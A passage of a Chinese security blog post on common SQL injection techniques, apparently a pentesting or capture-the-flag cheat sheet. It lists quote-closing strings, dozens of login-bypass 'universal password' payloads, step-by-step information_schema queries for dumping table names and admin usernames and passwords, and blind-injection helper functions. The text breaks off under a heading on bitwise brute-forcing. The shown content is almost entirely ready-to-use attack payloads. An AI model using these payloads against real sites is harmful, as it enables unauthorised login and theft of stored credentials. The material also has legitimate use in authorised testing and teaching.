<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>SQL注入-常用姿势 - 东隅 Blog</title><meta name="author" content="东隅">
<meta name="author-link" content="">
<meta name="description" content="" /><meta name="keywords" content='OWASP, SQL注入' />
  <meta itemprop="name" content="SQL注入-常用姿势">
  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="wordCount" content="1422">
  <meta itemprop="keywords" content="OWASP,SQL注入"><meta property="og:url" content="https://dongyu29.github.io/posts/owasp/sql%E6%B3%A8%E5%85%A5/116/">
  <meta property="og:site_name" content="东隅 Blog">
  <meta property="og:title" content="SQL注入-常用姿势">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:tag" content="OWASP">
    <meta property="article:tag" content="SQL注入">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="SQL注入-常用姿势">
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/owasp/sql%E6%B3%A8%E5%85%A5/116/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E6%95%B0%E6%8D%AE%E5%BA%93/80/" /><link rel="next" href="https://dongyu29.github.io/posts/owasp/sql%E6%B3%A8%E5%85%A5/118/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "SQL注入-常用姿势",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/dongyu29.github.io\/posts\/owasp\/sql%E6%B3%A8%E5%85%A5\/116\/"
    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "OWASP, SQL注入","wordcount":  1422 ,
    "url": "https:\/\/dongyu29.github.io\/posts\/owasp\/sql%E6%B3%A8%E5%85%A5\/116\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
      "@type": "Organization",
      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
        "@type": "Person",
        "name": "东隅"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">SQL注入-常用姿势</li>
    </ol>
  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>SQL注入-常用姿势</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/owasp/" class="post-category" title="Category - OWASP"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> OWASP</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="1422 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>7 minutes</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#布尔">布尔</a></li>
    <li><a href="#时间">时间</a>
      <ul>
        <li><a href="#sleep">sleep()</a></li>
        <li><a href="#benchmarktexp">benchmark(t,exp)</a></li>
        <li><a href="#笛卡尔积">笛卡尔积</a></li>
        <li><a href="#get_lock">GET_LOCK()</a></li>
        <li><a href="#rlike正则">RLIKE正则</a></li>
        <li><a href="#寻找新的延迟函数">寻找新的延迟函数</a></li>
      </ul>
    </li>
    <li><a href="#报错">报错</a></li>
  </ul>

  <ul>
    <li><a href="#简略">简略</a></li>
    <li><a href="#1宽字节概念">1、宽字节概念</a></li>
    <li><a href="#2addslashes函数">2、addslashes()函数</a></li>
    <li><a href="#3-sql的执行过程">3. SQL的执行过程</a></li>
    <li><a href="#4-宽字节注入">4. 宽字节注入</a></li>
    <li><a href="#5-防护手段">5. 防护手段</a></li>
    <li><a href="#6编码转换">6.编码转换</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="闭合" class="heading-element"><span>闭合</span>
  <a href="#%e9%97%ad%e5%90%88" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#a6be9d">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">)
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">))
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#39;))
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#34;</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">\</span></span></span></code></pre></div><h1 id="万能密码" class="heading-element"><span>万能密码</span>
  <a href="#%e4%b8%87%e8%83%bd%e5%af%86%e7%a0%81" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#a6be9d">&#39; or 1=&#39;</span><span style="color:#a6be9d">1</span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#39; || 1#
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#39;</span> <span style="color:#ff636f">&amp;</span> <span style="color:#a6be9d">1</span><span style="color:#ff636f">#</span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#39;or&#39;</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;or&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">admin</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">admin</span><span style="color:#a6be9d">&#39;--
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">admin&#39;</span> <span style="color:#ff636f">or</span> <span style="color:#a6be9d">4</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">4</span><span style="color:#828b96;font-style:italic">--
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">admin</span><span style="color:#a6be9d">&#39; or &#39;</span><span style="color:#a6be9d">1</span><span style="color:#a6be9d">&#39;=&#39;</span><span style="color:#a6be9d">1</span><span style="color:#a6be9d">&#39;--
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">admin888
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#34;or &#34;a&#34;=&#34;a
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">admin&#39;</span> <span style="color:#ff636f">or</span> <span style="color:#a6be9d">2</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">2</span><span style="color:#ff636f">#</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">a</span><span style="color:#a6be9d">&#39; having 1=1#
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">a&#39;</span> <span style="color:#ff636f">having</span> <span style="color:#a6be9d">1</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">1</span><span style="color:#828b96;font-style:italic">--
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">admin</span><span style="color:#a6be9d">&#39; or &#39;</span><span style="color:#a6be9d">2</span><span style="color:#a6be9d">&#39;=&#39;</span><span style="color:#a6be9d">2</span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#39;)or(&#39;</span><span style="color:#58a1dd">a</span><span style="color:#a6be9d">&#39;=&#39;</span><span style="color:#58a1dd">a</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">or</span> <span style="color:#a6be9d">4</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">4</span><span style="color:#828b96;font-style:italic">--
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">c</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">a</span><span style="color:#a6be9d">&#39;or&#39;</span> <span style="color:#a6be9d">4</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">4</span><span style="color:#828b96;font-style:italic">--
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#a6be9d">&#34;or 4=4--
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#39;or&#39;a&#39;=&#39;a
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#34;</span><span style="color:#ff636f">or</span><span style="color:#a6be9d">&#34;=&#34;</span><span style="color:#58a1dd">a</span><span style="color:#a6be9d">&#39;=&#39;</span><span style="color:#58a1dd">a</span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#39;or&#39;&#39;=&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#39;or&#39;</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;or&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">1</span> <span style="color:#ff636f">or</span> <span style="color:#a6be9d">&#39;1&#39;</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;1&#39;</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">1</span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">1</span> <span style="color:#ff636f">or</span> <span style="color:#a6be9d">&#39;1&#39;</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;1&#39;</span> <span style="color:#ff636f">or</span> <span style="color:#a6be9d">4</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">4</span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#39;OR 4=4%00
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#34;or 4=4%00
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#39;</span><span style="color:#58a1dd">xor</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">admin</span><span style="color:#a6be9d">&#39; UNION Select 1,1,1 FROM admin Where &#39;&#39;=&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">-</span><span style="color:#a6be9d">1</span><span style="color:#ff636f">%</span><span style="color:#58a1dd">cf</span><span style="color:#a6be9d">&#39; union select 1,1,1 as password,1,1,1 %23
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">1
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">17..admin&#39;</span> <span style="color:#ff636f">or</span> <span style="color:#a6be9d">&#39;a&#39;</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;a 密码随便
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#39;</span><span style="color:#ff636f">or</span><span style="color:#a6be9d">&#39;=&#39;</span><span style="color:#ff636f">or</span><span style="color:#a6be9d">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#39;</span><span style="color:#ff636f">or</span> <span style="color:#a6be9d">4</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">4</span><span style="color:#828b96;font-style:italic">/*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">something
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">&#39; OR &#39;1&#39;=&#39;1
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">1&#39;or&#39;1&#39;=&#39;1
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">admin&#39; OR 4=4/*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">1&#39;or&#39;1&#39;=&#39;1</span></span></span></code></pre></div><h1 id="普通手注" class="heading-element"><span>普通手注</span>
  <a href="#%e6%99%ae%e9%80%9a%e6%89%8b%e6%b3%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#a6be9d">1</span>.数据库总数
</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#ff636f">count</span>(<span style="color:#ff636f">SCHEMA_NAME</span>) <span style="color:#ff636f">from</span> <span style="color:#58a1dd">information_schema</span>.<span style="color:#58a1dd">SCHEMATA</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">2</span>.数据库长度
</span></span><span style="display:flex;"><span><span style="color:#ff636f">length</span>(<span style="color:#ff636f">database</span>())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">3</span>.数据库名字
</span></span><span style="display:flex;"><span><span style="color:#ff636f">database</span>()
</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#58a1dd">group_concat</span>(<span style="color:#ff636f">schema_name</span>) <span style="color:#ff636f">from</span> <span style="color:#58a1dd">information_schema</span>.<span style="color:#58a1dd">schemata</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">4</span>.表的个数
</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#ff636f">count</span>(<span style="color:#ff636f">TABLE_NAME</span>) <span style="color:#ff636f">from</span> <span style="color:#58a1dd">information_schema</span>.<span style="color:#58a1dd">TABLES</span> <span style="color:#ff636f">where</span> <span style="color:#58a1dd">TABLE_SCHEMA</span><span style="color:#ff636f">=</span><span style="color:#ff636f">database</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">5</span>.表名长度
</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#ff636f">length</span>(<span style="color:#ff636f">TABLE_NAME</span>) <span style="color:#ff636f">from</span> <span style="color:#58a1dd">information_schema</span>.<span style="color:#58a1dd">TABLES</span> <span style="color:#ff636f">where</span> <span style="color:#58a1dd">TABLE_SCHEMA</span><span style="color:#ff636f">=</span><span style="color:#ff636f">database</span>() <span style="color:#ff636f">limit</span> <span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">6</span>.表名
</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#ff636f">TABLE_NAME</span> <span style="color:#ff636f">from</span> <span style="color:#58a1dd">information_schema</span>.<span style="color:#58a1dd">TABLES</span> <span style="color:#ff636f">where</span> <span style="color:#58a1dd">TABLE_SCHEMA</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">database</span>() <span style="color:#ff636f">limit</span> <span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">1</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">7</span>.列数
</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#ff636f">count</span>(<span style="color:#ff636f">column_name</span>) <span style="color:#ff636f">from</span> <span style="color:#58a1dd">information_schema</span>.<span style="color:#58a1dd">COLUMNS</span> <span style="color:#ff636f">where</span> <span style="color:#ff636f">TABLE_NAME</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;表名&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">8</span>.列名长度
</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#ff636f">length</span>(<span style="color:#ff636f">column_name</span>) <span style="color:#ff636f">from</span> <span style="color:#58a1dd">information_schema</span>.<span style="color:#58a1dd">COLUMNS</span> <span style="color:#ff636f">where</span> <span style="color:#ff636f">TABLE_NAME</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;表名&#39;</span> <span style="color:#ff636f">limit</span> <span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">9</span>.列名
</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#ff636f">COLUMN_NAME</span> <span style="color:#ff636f">from</span> <span style="color:#58a1dd">information_schema</span>.<span style="color:#58a1dd">COLUMNS</span> <span style="color:#ff636f">where</span> <span style="color:#ff636f">TABLE_NAME</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;表名&#39;</span> <span style="color:#ff636f">limit</span> <span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">10</span>.数据长度
</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#ff636f">COLUMN_NAME</span> <span style="color:#ff636f">from</span> <span style="color:#58a1dd">information_schema</span>.<span style="color:#58a1dd">COLUMNS</span> <span style="color:#ff636f">where</span> <span style="color:#ff636f">TABLE_NAME</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;表名&#39;</span> <span style="color:#ff636f">limit</span> <span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">11</span>.数据
</span></span><span style="display:flex;"><span><span style="color:#ff636f">select</span> <span style="color:#58a1dd">concat</span>(<span style="color:#58a1dd">username</span>,<span style="color:#a6be9d">&#34;-----&#34;</span>,<span style="color:#58a1dd">password</span>) <span style="color:#ff636f">from</span> <span style="color:#ff636f">admin</span> <span style="color:#ff636f">limit</span> <span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">1</span>),<span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">1</span></span></span></code></pre></div><h1 id="盲注" class="heading-element"><span>盲注</span>
  <a href="#%e7%9b%b2%e6%b3%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>盲注常用函数</p>
<p><code>截取</code></p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">left</span>(), <span style="color:#ff636f">right</span>(), <span style="color:#ff636f">substring</span>(), <span style="color:#58a1dd">substring_index</span>(), <span style="color:#58a1dd">mid</span>(), <span style="color:#58a1dd">substr</span>()
</span></span><span style="display:flex;"><span>其中<span style="color:#58a1dd">mid</span>(), <span style="color:#58a1dd">substr</span>() 等价于 <span style="color:#ff636f">substring</span>() 函数</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#58a1dd">ORD</span>()  <span style="color:#58a1dd">ascii</span>()                  :转换成<span style="color:#58a1dd">ascii码</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">Length</span>()                        :统计长度
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Sleep</span>()                         :延迟函数
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">benchmark</span>()                     :延迟函数
</span></span><span style="display:flex;"><span><span style="color:#ff636f">If</span>(<span style="color:#58a1dd">condition</span>,<span style="color:#ff636f">true</span>,<span style="color:#ff636f">false</span>)        :条件语句
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">regexp</span>                          :正则
</span></span><span style="display:flex;"><span><span style="color:#ff636f">database</span>()                      :查看当前数据库名
</span></span><span style="display:flex;"><span><span style="color:#ff636f">version</span>()                       :查看数据库版本
</span></span><span style="display:flex;"><span><span style="color:#ff636f">user</span>()                          :查看当前用户</span></span></code></pre></div><p><code>按位爆破</code></p>
